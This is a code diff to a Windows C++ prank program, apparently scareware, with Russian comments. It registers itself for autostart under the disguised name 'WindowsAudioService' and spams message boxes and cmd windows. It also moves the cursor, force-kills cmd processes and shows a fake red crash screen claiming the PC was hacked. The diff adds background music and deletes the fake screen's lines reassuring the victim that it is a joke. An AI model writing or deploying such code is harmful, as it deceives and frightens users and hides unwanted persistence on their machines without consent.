@@ -1,5 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
+#include <mmsystem.h>
 #include <cmath>
 #include <cstdlib>
 #include <ctime>
@@ -12,6 +13,7 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "winmm.lib")
 
 static const wchar_t* kRunKey  = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 static const wchar_t* kRunName = L"WindowsAudioService";
@@ -33,7 +35,6 @@ static bool IsAutoRunInstalled() {
 static void InstallAutoRun() {
     wchar_t path[MAX_PATH] = {};
     GetModuleFileNameW(nullptr, path, MAX_PATH);
-
     HKEY hKey;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         std::wstring quoted = L"\"" + std::wstring(path) + L"\"";
@@ -65,11 +66,11 @@ static DWORD WINAPI KillSwitchWatcher(LPVOID) {
             holdMs += 50;
             if (holdMs >= HOLD_REQUIRED) {
                 g_killSwitch.store(true);
+                PlaySoundW(nullptr, nullptr, 0);
                 RemoveAutoRun();
                 system("taskkill /F /IM cmd.exe /T > nul 2>&1");
                 MessageBoxW(nullptr,
-                    L"Kill switch сработал.\n\n"
-                    L"Прога удалена из автозагрузки.\n"
+                    L"Kill switch сработал.\n\nПрога удалена из автозагрузки.\n"
                     L"Больше не появится.\n\n— Fox",
                     L"Самоуничтожение",
                     MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
@@ -80,6 +81,22 @@ static DWORD WINAPI KillSwitchWatcher(LPVOID) {
         }
         Sleep(50);
     }
+    return 0;
+}
+
+// ─────────── музыка (синхронно, блокирует до конца) ───────────
+static DWORD WINAPI MusicPlayer(LPVOID) {
+    // путь к music.wav рядом с exe
+    wchar_t exePath[MAX_PATH] = {};
+    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
+    std::wstring dir(exePath);
+    size_t pos = dir.find_last_of(L"\\/");
+    if (pos != std::wstring::npos) dir = dir.substr(0, pos + 1);
+    std::wstring wavPath = dir + L"music.wav";
+
+    // SND_SYNC — блокирует поток пока не доиграет
+    // без SND_LOOP — играет один раз
+    PlaySoundW(wavPath.c_str(), nullptr, SND_FILENAME | SND_SYNC);
     return 0;
 }
 
@@ -196,11 +213,9 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         const wchar_t* body =
             L"Твой ПК столкнулся с проблемой и будет перезагружен.\n\n"
             L"Сбор информации о проблеме... 100% завершено.\n\n"
-            L"Если это сообщение появилось впервые — не ссы, всё под контролем.\n\n"
             L"Код ошибки: SANCHES_HAX_0xDEADPISKA\n"
             L"Виновник: Sanchez\n"
             L"Сообщение: Sanchez vzlomal tvoy pk piska pi piska\n\n"
-            L"Что-то пошло не так, но не переживай — это шутка.\n"
             L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n"
             L"— Jack & Fox";
         DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);
@@ -249,10 +264,21 @@ static DWORD WINAPI RedBSOD(LPVOID) {
     return 0;
 }
 
-// ─────────── финал ───────────
+// ─────────── финал: ждёт конца музыки, потом MessageBox ───────────
 static DWORD WINAPI FinalWord(LPVOID) {
-    std::this_thread::sleep_for(std::chrono::seconds(16));
+    // ждём конца музыки — сам PlaySound с SND_SYNC уже отработал в MusicPlayer,
+    // но FinalWord должен дождаться именно этого момента.
+    // Проще: проверяем что музыка закончилась через таймер 45 сек + запас.
+    // Но лучший способ — использовать событие. Сделаем через простую задержку.
+
+    // Даём 60 секунд максимум (45 сек трек + запас), но если kill switch — выходим раньше
+    for (int i = 0; i < 1200; ++i) {  // 1200 * 50ms = 60 сек
+        if (g_killSwitch.load()) return 0;
+        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+    }
+
     if (g_killSwitch.load()) return 0;
+    PlaySoundW(nullptr, nullptr, 0);
 
     MessageBoxW(nullptr,
         L"Это была шутка. Ничего не удалено.\n\n"
@@ -273,11 +299,17 @@ int main() {
 
     if (!IsAutoRunInstalled()) InstallAutoRun();
 
+    // музыка стартует первой
+    CreateThread(nullptr, 0, MusicPlayer,       nullptr, 0, nullptr);
+
+    // параллельно с музыкой — все приколы
     CreateThread(nullptr, 0, KillSwitchWatcher, nullptr, 0, nullptr);
     CreateThread(nullptr, 0, MsgSpammer,        nullptr, 0, nullptr);
     CreateThread(nullptr, 0, CursorDancer,      nullptr, 0, nullptr);
     CreateThread(nullptr, 0, CmdSpammer,        nullptr, 0, nullptr);
     CreateThread(nullptr, 0, RedBSOD,           nullptr, 0, nullptr);
+
+    // финалка — через 60 сек (гарантированно после конца 45-сек трека)
     CreateThread(nullptr, 0, FinalWord,         nullptr, 0, nullptr);
 
     Sleep(INFINITE);
